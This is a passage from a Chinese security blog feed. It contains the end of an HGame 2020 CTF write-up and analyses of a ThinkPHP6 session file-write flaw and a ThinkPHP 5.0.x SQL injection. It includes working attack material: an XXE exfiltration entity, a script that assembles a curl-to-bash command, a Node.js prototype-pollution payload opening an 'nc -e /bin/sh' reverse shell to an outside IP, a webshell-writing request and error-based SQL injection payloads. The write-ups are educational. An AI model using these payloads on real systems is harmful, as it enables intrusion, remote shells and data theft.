file_put_contents(&quot;mes/&quot;.date(&quot;h_m_s&quot;).&quot;.txt&quot;,$a);?&gt;</code></pre><pre><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><pre><code class="php">&lt;?phperror_reporting(0);$token = @$_GET[&#39;token&#39;];if (!isset($token)) {    die(&quot;请带上您的队伍token访问! /?token=&quot;);}$api = &quot;http://checker/?token=&quot;.$token;$t = file_get_contents($api);if($t !== &quot;ok&quot;) {    die(&quot;队伍token错误&quot;);}highlight_file(__FILE__);$sandbox = &#39;/var/www/html/sandbox/&#39;. md5(&quot;hgame2020&quot; . $token);;@mkdir($sandbox);@chdir($sandbox);$content = $_GET[&#39;v&#39;];if (isset($content)) {    $cmd = substr($content,0,5);    system($cmd);}else if (isset($_GET[&#39;r&#39;])) {    system(&#39;rm -rf ./*&#39;);}/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | | | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_| |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)                                    |/*/</code></pre><p>然后利用 <a href="https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a> </p><p>的方法来执行命令</p><pre><code class="php">&lt;?php    $a=file_get_contents(&quot;tmp.xml&quot;);    $command=array(    &#39;&gt;ls\\\\&#39;,     &#39;ls&gt;_&#39;,     &#39;&gt;\\ \\\\&#39;,     &#39;&gt;-t\\\\&#39;,     &#39;&gt;\\&gt;g&#39;,     &#39;ls&gt;&gt;_&#39;,    &quot;&gt;bash&quot;,    &quot;&gt;\\|\\\\&quot;,    &quot;&gt;5\\\\&quot;,    &quot;&gt;00\\\\&quot;,    &quot;&gt;60\\\\&quot;,    &quot;&gt;9:\\\\&quot;,    &quot;&gt;21\\\\&quot;,    &quot;&gt;4.\\\\&quot;,    &quot;&gt;16\\\\&quot;,    &quot;&gt;8.\\\\&quot;,    &quot;&gt;10\\\\&quot;,    &quot;&gt;9.\\\\&quot;,    &quot;&gt;3\\\\&quot;,    &quot;&gt;\\ \\\\&quot;,    &quot;&gt;rl\\\\&quot;,    &quot;&gt;cu\\\\&quot;    );    foreach($command as $v)    {        echo $v.&quot;\n&quot;;        $v=urlencode($v);        file_put_contents(&quot;evil.xml&quot;,str_replace(&quot;TGT&quot;,$v,$a));        $postdata=&lt;&lt;&lt;MRK&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE msg [&lt;!ELEMENT msg ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;%sp;%param1;]&gt;&lt;msg&gt;&lt;id&gt;&amp;exfil;&lt;/id&gt;&lt;name&gt;b&lt;/name&gt;&lt;level&gt;c&lt;/level&gt;&lt;time&gt;d&lt;/time&gt;&lt;/msg&gt;MRK;        $opts = array(&#39;http&#39; =&gt;         array( &#39;method&#39;  =&gt; &#39;POST&#39;,        &#39;header&#39;  =&gt; &#39;Content-type: application/x-www-form-urlencoded&#39;,        &#39;content&#39; =&gt; $postdata )     );        $context = stream_context_create($opts);        file_get_contents(&quot;http://bdctr.hgame.day-day.work/submit.php&quot;, false, $context);    }?&gt;</code></pre><p>在经历一次rm -rf 之后,终于拿到getshell</p><p><img src="https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png" alt="image26112"></p><p><code>hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}</code></p><h3 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h3><p>刚拿到题目的时候,我心态被第一题搞崩了,随便看了一下,就溜去打游戏了,看了wp,艹</p><p>拿到题目,是我不熟悉的nodejs</p><p>影响不大,看个大概就会了</p><p><code>\route\index.js</code></p><pre><code class="javascript">router.post(&#39;/action&#39;, function (req, res) {  if (!req.session.sekiro) {    res.end(&quot;Session required.&quot;)  }  if (!req.session.sekiro.alive) {    res.end(&quot;You dead.&quot;)  }  var body = JSON.parse(JSON.stringify(req.body));//原型链污染起点  var copybody = clone(body)  if (copybody.solution) {    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)  }  res.end(&quot;提交成功&quot;+JSON.stringify(req.body))})</code></pre><p>在注释处有一个奇怪的操作,转成json再转成解析成obj</p><p>这摆明了有问题,遇到<code>JSON.parse+merge</code> ,思路可以往原型链污染上走一走</p><p>我们继续阅读代码</p><p>跟进dealWithAttacks</p><pre><code class="javascript">this.dealWithAttacks = function (sekiro, solution) {        if (sekiro.attackInfo.solution !== solution) {            sekiro.health -= sekiro.attackInfo.attack            if (sekiro.attackInfo.additionalEffect) {                var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)                sekiro = fn(sekiro)//look this            }        }        sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500        sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0        if (sekiro.posture == 500 || sekiro.health == 0) {            sekiro.alive = false        }        return sekiro    }</code></pre><pre><code class="javascript">var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)                sekiro = fn(sekiro)</code></pre><p>明显的代码执行,如果我们能控制<code>sekiro.attackInfo.additionalEffect</code>,那么便可以执行任意代码了</p><p>我们看一下<code>sekiro.attackInfo.additionalEffect</code>是如何获得的</p><pre><code class="javascript">this.attacks = [        {            &quot;method&quot;: &quot;连续砍击&quot;,            &quot;attack&quot;: 1000,            &quot;additionalEffect&quot;: &quot;sekiro.posture+=100&quot;,            &quot;solution&quot;: &quot;连续格挡&quot;        },        {            &quot;method&quot;: &quot;普通攻击&quot;,            &quot;attack&quot;: 500,            &quot;additionalEffect&quot;: &quot;sekiro.posture+=50&quot;,            &quot;solution&quot;: &quot;格挡&quot;        },        {            &quot;method&quot;: &quot;下段攻击&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;跳跃踩头&quot;        },        {            &quot;method&quot;: &quot;突刺攻击&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;识破&quot;        },        {            &quot;method&quot;: &quot;巴之雷&quot;,            &quot;attack&quot;: 1000,            &quot;solution&quot;: &quot;雷反&quot;        },    ]    this.getAttackInfo = function () {        return this.attacks[Math.floor(Math.random() * this.attacks.length)]    }</code></pre><p>是从<code>attacks</code>中随机挑一个拿出来的,而其中某些是没有<code>additionalEffect</code>属性的</p><p>根据js根据原型链来查找属性的特性</p><p>我们可以用原型链污染来修改Object的additionalEffect属性</p><p>payload:</p><pre><code>POST /action HTTP/1.1Host: sekiro.hgame.babelfish.inkContent-Length: 169Pragma: no-cacheCache-Control: no-cacheAccept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36Content-Type: application/json; charset=UTF-8Referer: http://sekiro.hgame.babelfish.ink/Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0gConnection: close{&quot;solution&quot;:123,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc 39.108.164.219 60000 -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p>content-type要设置成<code>Content-Type: application/json</code></p><p>不然<code>__proto__</code>是无法当初键的,那么merge也就没用了</p><p><code>hgame{j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us}</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p> <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a> </p><h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>就说说咋拿到密码的</p><p>压缩文件提示<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p><p>利用搜索引擎(<code>Pixiv@純白可憐</code>)拿到密码</p><h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>解压得到一个文本和一个压缩包</p><p>观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)</p><p>然后拿到里面的word文档,但是是加密的,猝.</p><p>在看一下那个文本,有点像培根密码</p><pre><code class="python">s=&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;.replace(&quot; &quot;,&quot;&quot;)[:-1]result=&quot;&quot;for i in range(0,len(s),5):    temp=&quot;&quot;    for j in range(5):        if s[i+j]==s[i+j].lower():            temp+=&quot;0&quot;        else :            temp+=&quot;1&quot;    result+=chr(int(temp,2)+ord(&#39;A&#39;))print(result)</code></pre><p>于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag</p><h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>解压得到password.txt和ok.zip</p><p>根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.</p><p>拿到一堆ook直接上谷歌.ok了</p><p>base32-&gt;base64-&gt;二维码</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>直接套脚本</p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-import gmpy2from secret import A, B, flagassert flag.startswith(&#39;hgame{&#39;) and flag.endswith(&#39;}&#39;)TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;MOD = len(TABLE)cipher = &#39;&#39;for b in flag:    i = TABLE.find(b)    if i == -1:        cipher += b    else:        ii = (A*i + B) % MOD        cipher += TABLE[ii]print(cipher)# A8I5z{xr1A_J7ha_vG_TpH410}</code></pre><p>我们观察可以发现这其实是个单表替换加密</p><p>那么我们只要生成生成一个加密表就可以很容易的求出加密内容</p><p>但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame</p><p>于是有</p><pre><code class="python">TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;MOD = len(TABLE)cipher=&quot;A8I5z{xr1A_J7ha_vG_TpH410}&quot;for A in range(1,MOD):    for B in range(1,MOD):        result=&quot;&quot;        try :            #生成加密表            TABLE2={}            for b in TABLE:                i=TABLE.find(b)                TABLE2[TABLE[(A*i + B) % MOD]]=b            #解密            for b in cipher:                ii=TABLE.find(b)                if ii==-1:                    result+=b                else :                    result+=TABLE2[b]        except :            pass        if &quot;hgame&quot; in result:            print(result)</code></pre><h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>覆盖变量值来执行后门函数</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/07/2020hgame/">https://www.ccreater.top/2020/02/07/2020hgame/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP6 任意文件操作漏洞分析</title>
      <link href="2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>ThinkPHP6.0.0-6.0.1</li><li>开启Sessoin中间件</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p><p>复现环境为:phpstudy+thinkphp6.0.1</p><p><code>\app\controller\index.php</code>:</p><pre><code class="php">&lt;?phpnamespace app\controller;use app\BaseController;use think\facade\Session;class Index extends BaseController{    public function index($name)    {        Session::set(&#39;name&#39;, $name);        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;    }}</code></pre><p><code>\app\middleware.php</code></p><pre><code class="php">&lt;?php// 全局中间件定义文件return [    // 全局请求缓存    // \think\middleware\CheckRequestCache::class,    // 多语言加载    // \think\middleware\LoadLangPack::class,//     Session初始化     \think\middleware\SessionInit::class];</code></pre><p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p><pre><code class="php">public function save(): void    {        $this-&gt;clearFlashData();//清除原来的数据        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p><pre><code class="php">public function write(string $sessID, string $sessData): bool    {        $filename = $this-&gt;getFileName($sessID, true);        $data     = $sessData;        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {            //数据压缩            $data = gzcompress($data, 3);        }        return $this-&gt;writeFile($filename, $data);    }</code></pre><p>再跟进<code>$this-&gt;writeFile</code></p><pre><code class="php">protected function writeFile($path, $content): bool    {        return (bool) file_put_contents($path, $content, LOCK_EX);    }</code></pre><p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p><p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p><p>跟进去</p><pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string    {        if ($this-&gt;config[&#39;prefix&#39;]) {            // 使用子目录            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;        } else {            $name = &#39;sess_&#39; . $name;        }        $filename = $this-&gt;config[&#39;path&#39;] . $name;        $dir      = dirname($filename);        if ($auto &amp;&amp; !is_dir($dir)) {            try {                mkdir($dir, 0755, true);            } catch (\Exception $e) {                // 创建失败            }        }        return $filename;    }</code></pre><p><code>$filename</code>直接由末端拼接参数<code>$name</code></p><p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p><pre><code class="php">    public function getId(): string    {        return $this-&gt;id;    }</code></pre><p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p><pre><code class="php">    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32</code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p><p>查找调用setId的函数</p><p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p><p>其中<code>SessionInit</code></p><pre><code class="php">    public function handle($request, Closure $next)    {        // Session初始化        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);        $cookieName   = $this-&gt;session-&gt;getName();        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {            $sessionId = $request-&gt;request($varSessionId);        } else {            $sessionId = $request-&gt;cookie($cookieName);        }        if ($sessionId) {            $this-&gt;session-&gt;setId($sessionId);        }    }</code></pre><p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p><p>因此构造payload</p><pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3ECookie :PHPSESSID=9f7777c08f3909751b148338ba08.php访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><pre><code class="php">public function setId($id=null):void{    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());}</code></pre><p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/02/01/ThinkPHP6">https://www.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/](<a href="https://www.ccreater.top/2020/02/01/ThinkPHP6">https://www.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP框架5.0.x_SQL注入分析</title>
      <link href="2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露"><a href="#ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露" class="headerlink" title="ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露"></a>ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露</h1><h2 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h2><p>开启debug模式的thinkphp5.0.x</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从官网上下载5.0.9完整版</p><p><code>application/index/controller/index.php</code>内容如下</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use app\model\Gather;class Index{    public function index()    {        $ids = input(&#39;ids/a&#39;);        $t = db(&quot;user&quot;);        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    }}</code></pre><p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们在漏洞的关键位置下个断点进行分析,<code>thinkphp\library\think\db\Builder.php</code>:383行</p><p>调用堆栈为:</p><p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p><p>从index()方法开始</p><pre><code class="php">public function index()    {        $ids = input(&#39;ids/a&#39;);        $t = db(&quot;user&quot;);        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    }</code></pre><p>调用<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>返回值的select()方法</p><p>我们先看下select()方法,它会将<code>$option</code>作为参数调用<code>Builder::select</code>方法</p><pre><code class="php">public function select($data = null)    {        ...        // 分析查询表达式        $options = $this-&gt;parseExpress();        ...        if (!$resultSet) {            // 生成查询SQL            $sql = $this-&gt;builder-&gt;select($options);            // 获取参数绑定            ...            }            ...    }</code></pre><p>我们跟进<code>$this-&gt;parseExpress();</code>看<code>$option</code>是如何生成的</p><pre><code class="php">protected function parseExpress()    {        $options = $this-&gt;options;        ...    }</code></pre><p>这里是直接令<code>$options = $this-&gt;options;</code>,而<code>$this-&gt;options</code>是<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>过程生成的</p><p>跟进去发现有这一条语句 <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,其中<code>$where</code>由<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>得到</p><p>获得<code>$option</code>的调用链为:</p><p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null)</code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p><p>我们回到<code>$this-&gt;builder-&gt;select($options);</code>,现在我们知道<code>$this-&gt;options[&#39;where&#39;][$logic]</code>是我们的可控位置</p><p>跟进去</p><pre><code class="php">public function select($options = [])    {        $sql = str_replace(            [&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;],            [                $this-&gt;parseTable($options[&#39;table&#39;], $options),                $this-&gt;parseDistinct($options[&#39;distinct&#39;]),                $this-&gt;parseField($options[&#39;field&#39;], $options),                $this-&gt;parseJoin($options[&#39;join&#39;], $options),                $this-&gt;parseWhere($options[&#39;where&#39;], $options),                $this-&gt;parseGroup($options[&#39;group&#39;]),                $this-&gt;parseHaving($options[&#39;having&#39;]),                $this-&gt;parseOrder($options[&#39;order&#39;], $options),                $this-&gt;parseLimit($options[&#39;limit&#39;]),                $this-&gt;parseUnion($options[&#39;union&#39;]),                $this-&gt;parseLock($options[&#39;lock&#39;]),                $this-&gt;parseComment($options[&#39;comment&#39;]),                $this-&gt;parseForce($options[&#39;force&#39;]),            ], $this-&gt;selectSql);        return $sql;    }</code></pre><p>这个<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>分支进入了关键的漏洞位置,此时<code>$where</code>可控</p><pre><code class="php">protected function parseWhere($where, $options)    {        $whereStr = $this-&gt;buildWhere($where, $options);        ...        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;    }</code></pre><p>再跟进<code>$this-&gt;buildWhere($where, $options)</code>,此时<code>$where</code>可控</p><pre><code class="php">public function buildWhere($where, $options)    {        if (empty($where)) {            $where = [];        }        if ($where instanceof Query) {            return $this-&gt;buildWhere($where-&gt;getOptions(&#39;where&#39;), $options);        }        $whereStr = &#39;&#39;;        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);        foreach ($where as $key =&gt; $val) {            $str = [];            foreach ($val as $field =&gt; $value) {                ...                    // 对字段使用表达式查询                    $field = is_string($field) ? $field : &#39;&#39;;                    $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);            }            $whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);        }        return $whereStr;    }</code></pre><p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>这个生成了sql语句的where部分,其中<code>$str</code>是由<code>$str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>生成的,而参数<code>$value[1]</code>就是我们<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payload中的键值</p><p>跟进<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p><pre><code class="php">protected function parseWhereItem($field, $val, $rule = &#39;&#39;, $options = [], $binds = [], $bindName = null)    {        $key = $field ? $this-&gt;parseKey($field, $options) : &#39;&#39;;        // 查询规则和条件        if (!is_array($val)) {            $val = [&#39;=&#39;, $val];        }        list($exp, $value) = $val;        // 字段分析        if(....){            ...        } elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) {            // IN 查询            if ($value instanceof \Closure) {                $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);            } else {                $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);                if (array_key_exists($field, $binds)) {                    $bind  = [];                    $array = [];                    foreach ($value as $k =&gt; $v) {                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                        } else {                            $bindKey = $bindName . &#39;_in_&#39; . $k;                        }                        $bind[$bindKey] = [$v, $bindType];                        $array[]        = &#39;:&#39; . $bindKey;                    }                    $this-&gt;query-&gt;bind($bind);                    $zone = implode(&#39;,&#39;, $array);                } else {                    $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));                }                $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;            }        }         return $whereStr;    }</code></pre><p>然后我们可以看到当<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>条件满足时,将会直接将我们payload中的键值直接拼接到sql语句中</p><pre><code class="php">                foreach ($value as $k =&gt; $v) {                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                        } else {                            $bindKey = $bindName . &#39;_in_&#39; . $k;                        }                        $bind[$bindKey] = [$v, $bindType];                        $array[]        = &#39;:&#39; . $bindKey;                    }</code></pre><p>而<code>$exp</code>则由<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>中的<code>&#39;in&#39;</code>经过一系列操作后得到</p><p>但是这里只能进行没有子查询语句的sql报错注入</p><p>如果有子查询语句的话就会报<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>的错误</p><p>所以这个sql注入有点不行,但时sql报错会暴露数据库配置却是非常有用的</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/">https://www.ccreater.top/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的2020</title>
      <link href="2020/01/31/%E6%88%91%E7%9A%842020/"/>
      <url>2020/01/31/%E6%88%91%E7%9A%842020/</url>
      
